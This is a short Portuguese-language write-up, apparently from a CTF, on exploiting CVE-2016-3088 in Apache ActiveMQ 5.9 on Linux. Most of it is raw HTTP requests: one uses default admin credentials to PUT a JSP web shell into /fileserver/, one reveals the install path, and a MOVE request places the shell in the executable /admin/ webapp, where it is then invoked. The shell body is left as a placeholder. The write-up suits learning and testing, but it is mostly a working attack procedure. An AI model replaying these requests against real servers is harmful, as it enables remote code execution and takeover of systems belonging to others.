Apache ActiveMQ 5.9 (Linux) - Directory Traversal / Command Execution

Recentemente me deparei com esta aplicação em um CTF e tive algumas dificuladades em explora-la,
pois os exploits encontrados não eram compativeis com a versão e o sistema operacional.

Testes realizados na versão ActiveMQ 5.9 com Linux.

Para saber mais sobre esta vulnerabilidade visite o link -> https://www.cvedetails.com/cve/CVE-2016-3088/

Abaixo segue os comandos utilizados para explorar esta versão e adquirir um RCE no host.

Apos rodar um scanner de diretorios identificamos o diretorio /fileserver/ e de acordo com o CVE podemos esplora-lo enviando requisições via PUT.
para a realização desta POC eu utilizei o Burp.

1 - Primeiro enviamos uma Shell.

#Enviando uma Shell em JSP
PUT /fileserver/shell.jsp HTTP/1.1
Host: 127.0.0.1:8161
Authorization: Basic YWRtaW46YWRtaW4=
Content-Length: 0

Escreva a shell aki
#-------------------------------

2 - Agora iremos identificar o caminho completo do arquivo para que possamos move-lo para /admin/, pois no diretorio /fileserver/ não temos permissão de execução.

#validar caminho do arquivo
PUT /fileserver/test/%20%20 HTTP/1.1
Authorization: Basic YWRtaW46YWRtaW4=
Host: 127.0.0.1:8161
Content-Length: 4

qualquertextoaki (precisa ser enviar algo, para que a aplicação responda)
#------------

3 - Agora vamos mover o shell para que possamos executa-lo

#Mover shell para /admin/
MOVE /fileserver/shell.jsp HTTP/1.1
Destination: file:///opt/apache-activemq-5.9.0/webapps/admin/shell.jsp
Authorization: Basic YWRtaW46YWRtaW4=
Host: 127.0.0.1:8161
Content-Length: 4


qualquertextoaki (precisa ser enviar algo, para que a aplicação responda)
#---------------------

4 - Agora vamos executar a shell atraves do link abaixo.

http://127.0.0.1/admin/shell.jsp

Referencias
https://www.cvedetails.com/cve/CVE-2016-3088/
https://www.seebug.org/vuldb/ssvid-96268

